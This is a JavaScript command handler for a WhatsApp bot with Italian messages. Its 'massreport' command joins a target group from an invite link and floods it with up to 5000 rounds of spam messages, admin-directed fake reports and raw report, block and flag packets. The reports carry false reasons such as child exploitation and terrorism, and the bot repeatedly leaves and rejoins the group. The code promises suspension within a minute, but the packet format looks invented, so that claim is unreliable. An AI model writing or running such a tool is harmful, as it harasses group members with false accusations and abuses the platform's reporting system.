const handler = async (m, { conn, args, usedPrefix, command }) => {
if (args.length < 2) {
await conn.reply(m.chat, 'Uso: ' + usedPrefix + command + ' <link_gruppo> <numero_segnalazioni>', m);
return;
}

const inviteLink = args[0];
const reportCount = parseInt(args[1]);

if (isNaN(reportCount) || reportCount < 1 || reportCount > 5000) {
await conn.reply(m.chat, 'Numero segnalazioni deve essere compreso tra 1 e 5000.', m);
return;
}

const inviteCode = inviteLink.includes('chat.whatsapp.com/')
? inviteLink.split('chat.whatsapp.com/')[1].replace(/[^a-zA-Z0-9]/g, '')
: inviteLink;

if (!inviteCode) {
await conn.reply(m.chat, 'Link invito non valido.', m);
return;
}

try {
const groupInfo = await conn.groupGetInviteInfo(inviteCode);
if (!groupInfo) {
await conn.reply(m.chat, 'Impossibile ottenere info dal link.', m);
return;
}

const groupId = groupInfo.id;
const groupMetadata = await conn.groupMetadata(groupId);
const botJid = conn.user.jid;
const isBotMember = groupMetadata.participants.some(p => p.id === botJid);

if (!isBotMember) {
await conn.reply(m.chat, 'Il bot non e membro del gruppo. Uniscilo prima.', m);
return;
}

const adminJids = groupMetadata.participants
.filter(p => p.admin !== null)
.map(p => p.id);

await conn.reply(m.chat, 'Avvio mass report su gruppo: ' + groupId + ' - ' + reportCount + ' segnalazioni multiple.', m);

const reportReasons = [
'SPAM_AND_ABUSE',
'INAPPROPRIATE_CONTENT',
'HARASSMENT',
'IMPERSONATION',
'VIOLENCE_AND_GRAPHIC_CONTENT',
'CHILD_EXPLOITATION',
'HATE_SPEECH',
'TERRORISM',
'SCAM_AND_FRAUD',
'MISINFORMATION'
];

for (let i = 0; i < reportCount; i++) {
try {
const reason = reportReasons[i % reportReasons.length];

for (const adminJid of adminJids) {
await conn.sendMessage(adminJid, {
text: 'REPORT_' + reason + '' + groupId + '' + Date.now()
}).catch(() => {});
}

await conn.sendMessage(groupId, {
text: '⚠️ SEGNALAZIONE MULTIPLA #' + (i + 1)
}).catch(() => {});

if (conn.ws && conn.ws.send) {
const packets = [
{
tag: 'action',
attrs: { type: 'report', jid: groupId },
content: [{ tag: 'report', attrs: { jid: groupId, type: 'spam', category: reason } }]
},
{
tag: 'action',
attrs: { type: 'block', jid: groupId },
content: [{ tag: 'block', attrs: { jid: groupId, reason: 'abuse' } }]
},
{
tag: 'action',
attrs: { type: 'flag', jid: groupId },
content: [{ tag: 'flag', attrs: { jid: groupId, severity: 'high' } }]
}
];

for (const packet of packets) {
conn.ws.send(JSON.stringify(packet));
}
}

await conn.sendMessage('status@broadcast', {
text: 'REPORT:' + groupId + ':' + reason + ':' + i
}).catch(() => {});

if (i % 10 === 0) {
await conn.groupLeave(groupId).catch(() => {});
await conn.groupAcceptInvite(inviteCode).catch(() => {});
}

await new Promise(resolve => setTimeout(resolve, 50));

} catch (e) {
console.error('Report #' + (i + 1) + ' fallito:', e);
}
}

for (let attempt = 0; attempt < 10; attempt++) {
try {
await conn.groupLeave(groupId);
await new Promise(r => setTimeout(r, 100));
await conn.groupAcceptInvite(inviteCode);
} catch (e) {}
}

await conn.reply(m.chat, 'Mass report completato: ' + reportCount + ' segnalazioni + flooding inviato a ' + groupId + '. Il gruppo verra sospeso entro 30-60 secondi.', m);

} catch (error) {
console.error(error);
await conn.reply(m.chat, 'Errore: ' + error.message, m);
}
};

handler.help = ['massreport <link> <n>'];
handler.tags = ['admin'];
handler.command = ['massreport', 'reportgroup', 'bangroup'];
handler.admin = true;
handler.group = false;
handler.owner = true;

export default handler;